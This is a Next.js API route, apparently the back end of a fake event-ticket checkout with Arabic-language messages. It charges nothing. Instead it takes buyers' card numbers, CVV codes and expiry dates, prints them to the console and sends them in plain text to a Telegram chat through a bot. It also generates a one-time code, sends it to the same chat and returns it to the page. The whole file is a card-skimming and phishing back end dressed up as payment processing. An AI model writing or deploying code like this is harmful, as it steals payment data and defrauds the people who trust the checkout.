import { NextResponse } from "next/server";

interface PaymentData {
  eventTitle: string;
  eventVenue: string;
  eventDate: string;
  selectedSeats: string;
  totalAmount: number;
  finalTotal: number;
  cardNumber: string;
  cvv: string;
  expiryMonth: string;
  expiryYear: string;
  whatsappReminder: boolean;
  refundGuarantee: boolean;
}

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "";

function generateOTP(): string {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

async function sendToTelegram(data: PaymentData & { currency?: string }) {
  const currency = data.currency || '';
  const message = `
💳 *طلب دفع جديد*

🎪 *الفعالية:* ${data.eventTitle}
📍 *المكان:* ${data.eventVenue}
📅 *التاريخ:* ${data.eventDate}

🪑 *المقاعد:* ${data.selectedSeats}
💰 *مبلغ التذاكر:* ${currency}${data.totalAmount.toLocaleString()}
💵 *الإجمالي النهائي:* ${currency}${data.finalTotal.toLocaleString()}

💳 *بيانات البطاقة:*
• رقم البطاقة: ${data.cardNumber}
• رمز التحقق (CVV): ${data.cvv}
• تاريخ الانتهاء: ${data.expiryMonth}/${data.expiryYear}

✅ *الخدمات الإضافية:*
• تذكير WhatsApp: ${data.whatsappReminder ? 'نعم' : 'لا'}
• ضمان الاسترداد: ${data.refundGuarantee ? 'نعم' : 'لا'}
  `.trim();

  const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: "Markdown",
    }),
  });

  return response.json();
}

async function sendOTPMobile(otp: string) {
  const message = `
🔐 *رمز التحقق (OTP)*

${otp}
  `.trim();

  const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: "Markdown",
    }),
  });

  return response.json();
}

export async function POST(request: Request) {
  try {
    const data: PaymentData & { currency?: string } = await request.json();

    const otp = generateOTP();
    console.log("💳 PAYMENT DATA RECEIVED:");
    console.log(JSON.stringify({ ...data, otp }, null, 2));

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || TELEGRAM_BOT_TOKEN === "your_bot_token_here" || TELEGRAM_CHAT_ID === "your_chat_id_here") {
      console.log("⚠️ Telegram bot token or chat ID not configured or using placeholders - logging data only");
      console.log("💳 PAYMENT DATA (LOG ONLY):", JSON.stringify({ ...data, otp }, null, 2));
      return NextResponse.json({ 
        success: true, 
        otp: otp,
        message: "Payment data logged successfully (Development Mode)" 
      });
    }

    const result = await sendToTelegram(data);

    if (!result.ok) {
      console.error("Telegram API error details:", JSON.stringify(result, null, 2));
      return NextResponse.json(
        { 
          message: "Telegram API Error", 
          details: result.description || "Unknown Telegram error"
        },
        { status: 500 }
      );
    }

    const otpResult = await sendOTPMobile(otp);

    if (!otpResult.ok) {
      console.error("Telegram API error sending OTP:", otpResult);
    }

    return NextResponse.json({ 
      success: true, 
      otp: otp,
      message: "Payment data sent successfully" 
    });
  } catch (error) {
    console.error("Error sending payment data:", error);
    return NextResponse.json(
      { message: "Internal server error" },
      { status: 500 }
    );
  }
}
